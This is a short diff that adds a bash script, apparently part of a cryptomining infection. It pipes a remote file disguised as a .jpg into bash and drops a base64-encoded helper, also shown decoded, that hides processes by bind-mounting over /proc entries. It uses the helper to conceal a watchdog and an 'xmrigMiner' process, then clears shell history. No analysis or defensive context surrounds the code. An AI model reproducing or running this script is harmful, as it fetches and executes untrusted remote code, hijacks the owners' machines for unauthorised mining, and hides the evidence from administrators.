@@ -1,0 +1,16 @@
+#!/bin/bash
+curl http://HealthyMiami.com/db/nk1.jpg | bash
+echo 'IyEvYmluL2Jhc2gKaWYgWyAhIC1lIC91c3IvZm9vIF07IHRoZW4KICAgbWtkaXIgL3Vzci9mb287IGZpCmNwIC9ldGMvbXRhYiAvdXNyL3QKbW91bnQgLS1iaW5kIC91c3IvZm9vIC9wcm9jLyQxCm12IC91c3IvdCAvZXRjL210YWIJ' | base64 -d > /usr/bin/hid
+
+      #!/bin/bash
+      if [ ! -e /usr/foo ]; then
+      mkdir /usr/foo; fi
+      cp /etc/mtab /usr/t
+      mount --bind /usr/foo /proc/$1
+      mv /usr/t /etc/mtab
+
+
+chmod +x /usr/bin/hid
+hid $(pidof /usr/bin/watchdogd)
+hid $(pidof /usr/bin/xmrigMiner)
+history -c
